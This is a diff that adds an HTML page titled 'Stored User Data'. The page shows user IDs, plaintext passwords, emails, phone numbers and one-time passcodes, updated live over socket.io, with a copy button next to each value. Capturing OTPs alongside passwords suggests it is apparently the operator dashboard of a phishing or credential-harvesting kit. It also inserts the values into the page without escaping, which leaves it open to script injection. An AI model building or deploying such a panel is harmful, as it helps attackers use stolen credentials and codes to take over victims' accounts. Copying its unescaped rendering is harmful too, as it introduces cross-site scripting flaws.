@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stored Data</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #e9ecef;
+            color: #333;
+        }
+        h2 {
+            color: #0055a4;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .display-section {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .user-entry {
+            background-color: #fff;
+            margin-bottom: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .user-entry:nth-child(even) {
+            background-color: #f0f0f0;
+        }
+        .data-entry {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .data-entry p {
+            margin: 0;
+            flex-grow: 1;
+        }
+        .copy-btn {
+            background-color: #ffd700;
+            color: #0055a4;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 4px;
+            margin-left: 10px;
+        }
+        .copy-btn:hover {
+            background-color: #e6c200;
+        }
+        .print-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: #ffd700;
+            color: #0055a4;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+        .print-btn:hover {
+            background-color: #e6c200;
+        }
+    </style>
+</head>
+<body>
+    <button class="print-btn" onclick="window.print()">Print as PDF</button>
+    <h2>Stored User Data</h2>
+    <div class="display-section" id="displaySection">
+        <!-- Stored data will appear here -->
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+        function displayData(data) {
+            const displaySection = document.getElementById('displaySection');
+            displaySection.innerHTML = data.map(entry => `
+                <div class="user-entry">
+                    <div class="data-entry">
+                        <p>User ID: ${entry.userId}</p>
+                        <button class="copy-btn" onclick="copyText('${entry.userId}')">Copy</button>
+                    </div>
+                    <div class="data-entry">
+                        <p>Password: ${entry.password}</p>
+                        <button class="copy-btn" onclick="copyText('${entry.password}')">Copy</button>
+                    </div>
+                    <div class="data-entry">
+                        <p>Email: ${entry.email || 'N/A'}</p>
+                        <button class="copy-btn" onclick="copyText('${entry.email || 'N/A'}')">Copy</button>
+                    </div>
+                    <div class="data-entry">
+                        <p>Phone: ${entry.phone || 'N/A'}</p>
+                        <button class="copy-btn" onclick="copyText('${entry.phone || 'N/A'}')">Copy</button>
+                    </div>
+                    <div class="data-entry">
+                        <p>OTP: ${entry.otp || 'N/A'}</p>
+                        <button class="copy-btn" onclick="copyText('${entry.otp || 'N/A'}')">Copy</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Copied to clipboard');
+            }).catch(err => {
+                console.error('Could not copy text: ', err);
+            });
+        }
+
+        socket.on('dataUpdated', displayData);
+
+        // Fetch data on page load
+        fetch('/data')
+            .then(response => response.json())
+            .then(data => displayData(data))
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
